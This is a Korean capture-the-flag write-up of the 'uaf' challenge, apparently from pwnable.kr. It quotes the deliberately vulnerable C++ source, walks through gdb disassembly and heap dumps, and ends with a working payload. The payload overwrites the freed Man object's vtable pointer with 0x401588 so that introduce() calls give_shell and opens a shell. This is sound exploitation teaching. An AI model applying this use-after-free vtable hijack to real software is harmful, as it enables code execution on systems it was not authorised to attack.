---
sort: 16
---

# uaf

home 디렉토리에 uaf.cpp파일에 소스코드가 들어있다.

```c++
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
```
Man class와 Woman class가 생긴게 거의 똑같이 생겨서 크기도 같을 것 같다. 따라서 왠지 둘이 heap영역에 할당될 때 서로 붙어서 할당이 될 것 같다. 

```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400ec4 <+0>:     push   %rbp
   
   ... (중략) ...

   0x0000000000400efb <+55>:    mov    $0x18,%edi
   0x0000000000400f00 <+60>:    callq  0x400d90 <_Znwm@plt>
   0x0000000000400f05 <+65>:    mov    %rax,%rbx
   0x0000000000400f08 <+68>:    mov    $0x19,%edx
   0x0000000000400f0d <+73>:    mov    %r12,%rsi
   0x0000000000400f10 <+76>:    mov    %rbx,%rdi
   0x0000000000400f13 <+79>:    callq  0x401264 <_ZN3ManC2ESsi>
   0x0000000000400f18 <+84>:    mov    %rbx,-0x38(%rbp)

   ... (중략) ...

   0x0000000000400f59 <+149>:   mov    $0x18,%edi
   0x0000000000400f5e <+154>:   callq  0x400d90 <_Znwm@plt>
   0x0000000000400f63 <+159>:   mov    %rax,%rbx
   0x0000000000400f66 <+162>:   mov    $0x15,%edx
   0x0000000000400f6b <+167>:   mov    %r12,%rsi
   0x0000000000400f6e <+170>:   mov    %rbx,%rdi
   0x0000000000400f71 <+173>:   callq  0x401308 <_ZN5WomanC2ESsi>
   0x0000000000400f76 <+178>:   mov    %rbx,-0x30(%rbp)
```

main함수 중 Man과 Woman이 할당되는 부분이다. `_Znwm`을 통해 24byte만큼 메모리 영역을 할당 받고, 그 후에 해당 영역과 함께 적절한 인자를 가지고 생성자를 호출하는 모습이다.<br>
`_Znwm`후에 반환값을 읽으면, 각각의 object가 할당된 메모리의 주소를 알 수 있다.

```gdb
(gdb) b* 0x0000000000400f05
Breakpoint 1 at 0x400f05
(gdb) b* 0x0000000000400f63
Breakpoint 2 at 0x400f63
(gdb) r
Starting program: /home/uaf/uaf

Breakpoint 1, 0x0000000000400f05 in main ()
(gdb) i r rax
rax            0x7ffc50 8387664
(gdb) c
Continuing.

Breakpoint 2, 0x0000000000400f63 in main ()
(gdb) i r rax
rax            0x7ffca0 8387744
```

Man과 Woman이 할당된 공간을 살펴보자.<br><br>
위는 Man, 아래는 Woman인데, 맨 첫 8byte에 virtual function table pointer가 들어있는 것을 확인할 수 있고, 그 뒤에 age값, 그 뒤에 name obj의 주소가 들어있는 것을 알 수 있다.

```gdb
Breakpoint 3, 0x0000000000400f7a in main ()
(gdb) x/20gx 0x7ffc50
0x7ffc50:       0x0000000000401570      0x0000000000000019
0x7ffc60:       0x00000000007ffc38      0x0000000000000031
0x7ffc70:       0x0000000000000004      0x0000000000000004
0x7ffc80:       0x0000000000000001      0x000000006c6c694a
0x7ffc90:       0x0000000000000000      0x0000000000000021

0x7ffca0:       0x0000000000401550      0x0000000000000015
0x7ffcb0:       0x00000000007ffc88      0x0000000000020351
0x7ffcc0:       0x0000000000000000      0x0000000000000000
0x7ffcd0:       0x0000000000000000      0x0000000000000000
0x7ffce0:       0x0000000000000000      0x0000000000000000
```

uaf는 use after free로 free된 영역을 다시 사용해서 발생하는 취약점이다.<br>
문제 해결의 시나리오는 다음과 같다.<br>
먼저 man, woman 객체를 free시킨다.<br>
그 후, man, woman과 크기가 같은 객체를 생성해서 man, woman이 사용했던 영역을 사용할 수 있도록 한 뒤, 해당 영역의 데이터값을 변조시킨다.<br>
그리고 man, woman에서 사용하는 함수를 호출하면 virtual function이기 때문에 해당 메모리 영역의 virtual table pointer값을 사용하게 되는데, 이 부분이 free가 되고 다른 object에 의해 수정이 되었기 때문에 여기서 프로그램의 흐름을 변조시킬 수 있다.<br>
man과 woman을 free한 다음에 똑같은 크기의 메모리를 다시 할당하면 man, woman이 사용하던 메모리 영역을 다시 할당받을 수 있는 것은, heap allocator의 특성으로, 여기에 대해서는 알아서 잘 공부해보자.<br>

```gdb
   0x0000000000400fcd <+265>:   mov    -0x38(%rbp),%rax
   0x0000000000400fd1 <+269>:   mov    (%rax),%rax
   0x0000000000400fd4 <+272>:   add    $0x8,%rax
   0x0000000000400fd8 <+276>:   mov    (%rax),%rdx
   0x0000000000400fdb <+279>:   mov    -0x38(%rbp),%rax
   0x0000000000400fdf <+283>:   mov    %rax,%rdi
   0x0000000000400fe2 <+286>:   callq  *%rdx
```

위는 main함수의 switch문에서 case1에 있는 man의 introduce함수 호출부분이다.<br>
먼저 man 객체의 첫번째 8byte에 있는 virtual function table pointer를 가져온 후, 해당 pointer의 값을 8 증가 시킨 후에 해당 영역에 있는 함수 포인터 값(여기서는 introduce 함수의 pointer값이 있을 것이다.)을 이용하여 호출하는 것을 볼 수 있다. 따라서 우리는 virtual table pointer값을 조작해서 case 1에서 introduce함수를 호출할 때 give_shell함수가 호출이 될 수 있도록 해야한다.<br>
Human의 vtable을 살펴보면 쉽게 give_shell의 함수 포인터가 있는 영역을 확인할 수 있다.<br>
따라서 코드상에서 introduce를 호출할 때 function table에 접근한 뒤 8byte를 더하기 때문에 give_shell function pointer가 저장되어있는 영역의 주소 - 8값(0x401588)으로 man의 virtual function table pointer를 바꾸면 된다.

```gdb
(gdb) x/10gx 0x0000000000401570
0x401570 <_ZTV3Man+16>: 0x000000000040117a      0x00000000004012d2
0x401580 <_ZTV5Human>:  0x0000000000000000      0x00000000004015f0
0x401590 <_ZTV5Human+16>:       0x000000000040117a      0x0000000000401192
0x4015a0 <_ZTS5Woman>:  0x00006e616d6f5735      0x0000000000000000
0x4015b0 <_ZTI5Woman>:  0x0000000000602390      0x00000000004015a0
(gdb) x/10i 0x000000000040117a
   0x40117a <_ZN5Human10give_shellEv>:  push   %rbp
   0x40117b <_ZN5Human10give_shellEv+1>:        mov    %rsp,%rbp
   0x40117e <_ZN5Human10give_shellEv+4>:        sub    $0x10,%rsp
   0x401182 <_ZN5Human10give_shellEv+8>:        mov    %rdi,-0x8(%rbp)
```

최종 payload는 다음과 같다.

```bash
# give_shell을 호출하기 위해 function pointer조작
uaf@pwnable:~$ python -c "print('\x88\x15\x40\x00\x00\x00\x00\x00')" > /tmp/dlfjs123123/input
# object의 크기 = 0x18 byte = 24 byte
uaf@pwnable:~$ ./uaf 24 "/tmp/dlfjs123123/input"
1. use
2. after
3. free
# man, woman free
3
1. use
2. after
3. free
# woman 영역이었던 공간 다시 할당받고 덮어쓰기
2
your data is allocated
1. use
2. after
3. free
# man 영역이었던 공간 다시 할당받고 덮어쓰기
2
your data is allocated
1. use
2. after
3. free
# m->introduce()를 통해 get_shell함수 호출
1
$ cat flag
```

```tip
## 알게 된 점

uaf
```